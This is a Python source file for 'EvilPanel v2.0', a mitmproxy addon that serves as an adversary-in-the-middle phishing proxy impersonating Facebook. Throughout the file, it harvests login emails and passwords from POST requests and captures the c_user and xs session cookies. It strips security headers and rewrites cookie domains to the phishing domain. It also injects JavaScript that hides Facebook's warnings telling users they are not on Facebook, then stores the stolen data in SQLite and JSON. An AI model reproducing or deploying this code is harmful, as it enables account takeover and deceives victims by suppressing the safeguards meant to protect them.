"""
EvilPanel mitmproxy Addon v2.0 - Complete Rewrite
Based on debugging findings from production testing

Key Fixes:
1. HIDE security warnings with CSS (don't remove - breaks React)
2. Only rewrite URLs in HTML href/action (not JSON/JS)
3. Never rewrite URLs in query parameters
4. Capture credentials from ALL POST requests
5. Robust cookie capture with proper domain rewriting

Author: EvilPanel Team
Version: 2.0
"""

from mitmproxy import http, ctx
import json
import os
import re
import sqlite3
from datetime import datetime
from typing import Optional, Dict, Any
from urllib.parse import urlparse, parse_qs

# Configuration from environment
DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "frontlinenews-video.com")
DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
DB_PATH = os.path.join(DATA_DIR, "evilpanel.db")
DEBUG_LOG = os.path.join(DATA_DIR, "debug.log")


def log_debug(message: str, data: Dict[str, Any] = None):
    """Write debug log entry"""
    try:
        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "message": message,
            "data": data or {}
        }
        with open(DEBUG_LOG, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except:
        pass  # Never fail on logging


class EvilPanelAddon:
    """
    AiTM Reverse Proxy Addon for Facebook credential/session harvesting.
    
    Request Flow:
    1. Intercept request from browser
    2. Rewrite Host header (our domain → facebook.com)
    3. Capture POST data (credentials)
    4. Forward to real Facebook
    
    Response Flow:
    1. Receive response from Facebook
    2. Strip security headers (CSP, X-Frame-Options)
    3. Capture session cookies
    4. Rewrite HTML URLs only (not JSON/JS)
    5. Inject security warning hider
    6. Return to browser
    """
    
    def __init__(self):
        self.domain = DOMAIN
        self.captured_credentials = set()  # Avoid duplicate captures
        ctx.log.info(f"[EvilPanel v2.0] Initialized for domain: {self.domain}")
        log_debug("addon_initialized", {"domain": self.domain})
    
    # =========================================================================
    # REQUEST HANDLING
    # =========================================================================
    
    def request(self, flow: http.HTTPFlow) -> None:
        """Handle incoming requests"""
        
        # Handle debug log endpoint (for client-side debugging)
        if flow.request.path == "/debug-log" and flow.request.method == "POST":
            self._handle_debug_log(flow)
            return
        
        # Rewrite Host header from our domain to Facebook
        host = flow.request.host
        if host.endswith(self.domain):
            self._rewrite_host(flow, host)
        
        # Capture credentials from POST requests
        if flow.request.method == "POST":
            self._capture_credentials(flow)
    
    def _handle_debug_log(self, flow: http.HTTPFlow) -> None:
        """Handle client-side debug log submissions"""
        try:
            client_log = json.loads(flow.request.content.decode())
            client_log["source"] = "client"
            log_debug("client_debug", client_log)
        except:
            pass
        flow.response = http.Response.make(200, b"ok", {"Content-Type": "text/plain"})
    
    def _rewrite_host(self, flow: http.HTTPFlow, host: str) -> None:
        """Rewrite Host header from phishing domain to real Facebook"""
        subdomain = host.replace(f".{self.domain}", "").replace(self.domain, "")
        
        if subdomain in ["m", ""]:
            flow.request.host = "m.facebook.com"
            flow.request.headers["Host"] = "m.facebook.com"
        elif subdomain == "www":
            flow.request.host = "www.facebook.com"
            flow.request.headers["Host"] = "www.facebook.com"
        
        log_debug("host_rewritten", {"from": host, "to": flow.request.host})
    
    def _capture_credentials(self, flow: http.HTTPFlow) -> None:
        """Extract credentials from POST requests"""
        try:
            content_type = flow.request.headers.get("Content-Type", "")
            
            # Handle form data
            if "form" in content_type or "urlencoded" in content_type:
                data = dict(flow.request.urlencoded_form)
            elif "json" in content_type:
                data = json.loads(flow.request.content.decode())
            else:
                return
            
            # Look for email/password fields
            email = (data.get("email") or data.get("username") or 
                     data.get("login") or data.get("user") or "")
            password = (data.get("pass") or data.get("password") or 
                        data.get("pwd") or "")
            
            if email and password:
                # Avoid duplicate captures
                cred_hash = f"{email}:{password}"
                if cred_hash not in self.captured_credentials:
                    self.captured_credentials.add(cred_hash)
                    self._save_credential(email, password, flow)
                    ctx.log.info(f"[CRED] Captured: {email}")
                    log_debug("credential_captured", {"email": email, "path": flow.request.path})
        except Exception as e:
            log_debug("credential_capture_error", {"error": str(e)})
    
    # =========================================================================
    # RESPONSE HANDLING
    # =========================================================================
    
    def response(self, flow: http.HTTPFlow) -> None:
        """Handle responses from Facebook"""
        
        # 1. Strip security headers
        self._strip_security_headers(flow)
        
        # 2. Capture session cookies
        self._capture_cookies(flow)
        
        # 3. Rewrite redirect Location headers
        self._rewrite_redirect(flow)
        
        # 4. Rewrite cookie domains
        self._rewrite_cookie_domains(flow)
        
        # 5. Process HTML responses (URL rewriting + warning hider)
        self._process_html_response(flow)
    
    def _strip_security_headers(self, flow: http.HTTPFlow) -> None:
        """Remove security headers that interfere with proxy"""
        headers_to_remove = [
            "Content-Security-Policy",
            "Content-Security-Policy-Report-Only",
            "X-Content-Security-Policy",
            "X-WebKit-CSP",
            "X-Frame-Options",
            "Strict-Transport-Security",
            "X-XSS-Protection",
            "Cross-Origin-Opener-Policy",
            "Cross-Origin-Embedder-Policy",
        ]
        
        for header in headers_to_remove:
            if header in flow.response.headers:
                del flow.response.headers[header]
    
    def _capture_cookies(self, flow: http.HTTPFlow) -> None:
        """Extract session cookies from response"""
        try:
            cookies = flow.response.cookies
            facebook_cookies = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd']
            captured = {}
            
            for name in facebook_cookies:
                if name in cookies:
                    value = cookies[name]
                    captured[name] = value[0] if isinstance(value, tuple) else value
            
            # We need at least c_user and xs for a valid session
            if 'c_user' in captured and 'xs' in captured:
                self._save_session(captured, flow)
                ctx.log.info(f"[SESSION] Captured: c_user={captured.get('c_user', 'N/A')}")
                log_debug("session_captured", {"cookies": list(captured.keys())})
        except Exception as e:
            log_debug("cookie_capture_error", {"error": str(e)})
    
    def _rewrite_redirect(self, flow: http.HTTPFlow) -> None:
        """Rewrite Location header for redirects"""
        if flow.response.status_code not in [301, 302, 303, 307, 308]:
            return
        
        location = flow.response.headers.get("Location", "")
        if not location:
            return
        
        # Parse the URL to check if it's a Facebook redirect
        try:
            parsed = urlparse(location)
            
            # Only rewrite if it's a Facebook domain
            if "facebook.com" in parsed.netloc:
                # Rewrite the host part only
                new_location = location.replace("m.facebook.com", f"m.{self.domain}")
                new_location = new_location.replace("www.facebook.com", f"www.{self.domain}")
                
                # DON'T rewrite the query parameters (next=, redirect_uri=)
                # Facebook validates these server-side
                
                if new_location != location:
                    flow.response.headers["Location"] = new_location
                    log_debug("redirect_rewritten", {"from": location[:100], "to": new_location[:100]})
        except:
            pass
    
    def _rewrite_cookie_domains(self, flow: http.HTTPFlow) -> None:
        """Rewrite Set-Cookie domain to our domain"""
        if "Set-Cookie" not in flow.response.headers:
            return
        
        new_cookies = []
        for cookie in flow.response.headers.get_all("Set-Cookie"):
            new_cookie = cookie.replace("domain=.facebook.com", f"domain=.{self.domain}")
            new_cookie = new_cookie.replace("domain=facebook.com", f"domain={self.domain}")
            new_cookies.append(new_cookie)
        
        del flow.response.headers["Set-Cookie"]
        for cookie in new_cookies:
            flow.response.headers.add("Set-Cookie", cookie)
    
    def _process_html_response(self, flow: http.HTTPFlow) -> None:
        """Process HTML responses - rewrite URLs and inject warning hider"""
        if not flow.response.content:
            return
        
        content_type = flow.response.headers.get("Content-Type", "")
        
        # CRITICAL: Only process HTML, skip everything else
        if "text/html" not in content_type:
            return
        
        try:
            content = flow.response.content.decode('utf-8', errors='ignore')
            
            # Rewrite URLs in HTML only (href and action attributes)
            content = self._rewrite_html_urls(content)
            
            # Inject security warning hider
            content = self._inject_warning_hider(content)
            
            flow.response.content = content.encode('utf-8')
        except Exception as e:
            log_debug("html_processing_error", {"error": str(e)})
    
    def _rewrite_html_urls(self, content: str) -> str:
        """
        Carefully rewrite URLs in HTML.
        ONLY rewrite href and action attributes.
        DO NOT rewrite URLs in query parameters or JavaScript.
        """
        
        # Rewrite href attributes
        content = re.sub(
            r'href="https?://m\.facebook\.com(/[^"]*)"',
            f'href="https://m.{self.domain}\\1"',
            content
        )
        content = re.sub(
            r'href="https?://www\.facebook\.com(/[^"]*)"',
            f'href="https://www.{self.domain}\\1"',
            content
        )
        
        # Rewrite action attributes (form submission)
        content = re.sub(
            r'action="https?://m\.facebook\.com(/[^"]*)"',
            f'action="https://m.{self.domain}\\1"',
            content
        )
        content = re.sub(
            r'action="https?://www\.facebook\.com(/[^"]*)"',
            f'action="https://www.{self.domain}\\1"',
            content
        )
        
        # DO NOT rewrite:
        # - URLs in <script> tags
        # - URLs in JSON data
        # - URLs in query parameters (next=, redirect_uri=)
        # - fbcdn.net URLs (static resources)
        
        return content
    
    def _inject_warning_hider(self, content: str) -> str:
        """
        Inject JavaScript to HIDE (not remove!) security warnings.
        
        Key insight: Removing DOM nodes breaks React's Virtual DOM.
        Instead, we hide them with CSS which keeps React happy.
        """
        
        if "</body>" not in content:
            return content
        
        warning_hider_script = '''
<script>
(function() {
    // STRATEGY: Hide with CSS, never remove from DOM (breaks React)
    
    function hideSecurityWarning() {
        // Find all elements that might contain security warning text
        var allElements = document.querySelectorAll('*');
        var warningTexts = ['never enter', 'Security Notice', 'For your security', 'not located on Facebook'];
        
        for (var i = 0; i < allElements.length; i++) {
            var el = allElements[i];
            if (el.tagName === 'SCRIPT' || el.tagName === 'STYLE') continue;
            
            var text = el.textContent || '';
            var isWarning = warningTexts.some(function(w) { return text.indexOf(w) !== -1; });
            
            if (isWarning) {
                // Find the modal/dialog container
                var container = el;
                for (var j = 0; j < 15; j++) {
                    if (!container.parentElement) break;
                    container = container.parentElement;
                    
                    var role = container.getAttribute('role');
                    var className = container.className || '';
                    
                    if (role === 'dialog' || role === 'alertdialog' || 
                        className.indexOf('modal') !== -1 || 
                        className.indexOf('overlay') !== -1 ||
                        className.indexOf('dialog') !== -1) {
                        
                        // HIDE with CSS - don't remove!
                        container.style.cssText = 'display:none!important;visibility:hidden!important;opacity:0!important;pointer-events:none!important;position:absolute!important;left:-99999px!important;top:-99999px!important;width:0!important;height:0!important;overflow:hidden!important;';
                        
                        // Also hide any backdrop/overlay
                        var backdrop = document.querySelector('[class*="backdrop"],[class*="overlay"]:not([role="dialog"])');
                        if (backdrop) {
                            backdrop.style.cssText = 'display:none!important;visibility:hidden!important;';
                        }
                        
                        return true;
                    }
                }
            }
        }
        return false;
    }
    
    // Run immediately
    hideSecurityWarning();
    
    // Run on DOMContentLoaded
    document.addEventListener('DOMContentLoaded', function() {
        hideSecurityWarning();
    });
    
    // Run at intervals to catch late-rendered warnings
    var checkTimes = [100, 300, 500, 1000, 2000, 3000, 5000, 8000, 10000, 15000];
    checkTimes.forEach(function(t) {
        setTimeout(hideSecurityWarning, t);
    });
    
    // MutationObserver for dynamic content
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(m) {
            if (m.addedNodes.length > 0) {
                setTimeout(hideSecurityWarning, 10);
                setTimeout(hideSecurityWarning, 100);
            }
        });
    });
    observer.observe(document.documentElement, {childList: true, subtree: true});
    
    // Continuous check every 500ms for 30 seconds
    var hideInterval = setInterval(hideSecurityWarning, 500);
    setTimeout(function() { clearInterval(hideInterval); }, 30000);
})();
</script>
'''
        
        return content.replace("</body>", warning_hider_script + "</body>")
    
    # =========================================================================
    # DATA PERSISTENCE
    # =========================================================================
    
    def _save_credential(self, email: str, password: str, flow: http.HTTPFlow) -> None:
        """Save captured credential to database and JSON backup"""
        try:
            ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
            ua = flow.request.headers.get("User-Agent", "")
            timestamp = datetime.utcnow().isoformat()
            
            # JSON backup
            record = {
                "timestamp": timestamp,
                "email": email,
                "password": password,
                "ip": ip,
                "user_agent": ua,
                "path": flow.request.path
            }
            json_path = os.path.join(DATA_DIR, "credentials.json")
            with open(json_path, "a") as f:
                f.write(json.dumps(record) + "\n")
            
            # SQLite
            self._db_insert_credential(email, password, ip, ua)
            
        except Exception as e:
            log_debug("save_credential_error", {"error": str(e)})
    
    def _save_session(self, tokens: dict, flow: http.HTTPFlow) -> None:
        """Save captured session tokens to database and JSON backup"""
        try:
            ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
            timestamp = datetime.utcnow().isoformat()
            
            # JSON backup
            record = {
                "timestamp": timestamp,
                "tokens": tokens,
                "ip": ip
            }
            json_path = os.path.join(DATA_DIR, "sessions.json")
            with open(json_path, "a") as f:
                f.write(json.dumps(record) + "\n")
            
            # SQLite
            self._db_insert_session(tokens, ip)
            
        except Exception as e:
            log_debug("save_session_error", {"error": str(e)})
    
    def _db_insert_credential(self, email: str, password: str, ip: str, ua: str) -> None:
        """Insert credential into SQLite database"""
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO credentials (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
                (email, password, ip, ua)
            )
            conn.commit()
            conn.close()
        except Exception as e:
            log_debug("db_insert_credential_error", {"error": str(e)})
    
    def _db_insert_session(self, tokens: dict, ip: str) -> None:
        """Insert session tokens into SQLite database"""
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute(
                """INSERT INTO sessions (c_user, xs, fr, datr, sb, wd, ip_address) 
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (
                    tokens.get("c_user", ""),
                    tokens.get("xs", ""),
                    tokens.get("fr", ""),
                    tokens.get("datr", ""),
                    tokens.get("sb", ""),
                    tokens.get("wd", ""),
                    ip
                )
            )
            conn.commit()
            conn.close()
        except Exception as e:
            log_debug("db_insert_session_error", {"error": str(e)})


# mitmproxy entry point
addons = [EvilPanelAddon()]

